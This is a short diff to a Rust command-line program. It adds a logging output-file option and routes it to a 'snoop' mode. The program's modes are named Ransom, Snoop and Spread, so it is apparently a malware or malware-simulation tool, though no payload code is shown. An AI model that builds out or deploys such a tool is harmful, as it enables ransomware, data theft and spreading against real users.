@@ -22,6 +22,10 @@ struct Cli {
     #[arg(short, long, value_name = "FILE")]
     config: Option<String>,
 
+    /// Set the logging info destination
+    #[arg(short, long, value_name = "FILE")]
+    output: Option<String>,
+
     /// Turn debugging information on
     #[arg(short, long, action = clap::ArgAction::Count)]
     debug: u8,
@@ -48,6 +52,8 @@ fn read_config(path: &str) -> Result<Config, ConfigError> {
 }
 
 fn main() {
+    env_logger::init();
+
     let cli = Cli::parse();
 
     // Show the disable mode
@@ -70,7 +76,13 @@ fn main() {
         match mode {
             Modes::Borrow => borrow(),
             Modes::Ransom => ransom(),
-            Modes::Snoop => snoop(Some(PathBuf::from("./sys.json"))),
+            Modes::Snoop => {
+                if let Some(output_dest) = cli.output {
+                    snoop(Some(&output_dest))
+                } else {
+                    snoop(None)
+                }
+            }
             Modes::Spread => spread(),
             _ => unreachable!(), // panics if code becomes not unreachable
         }
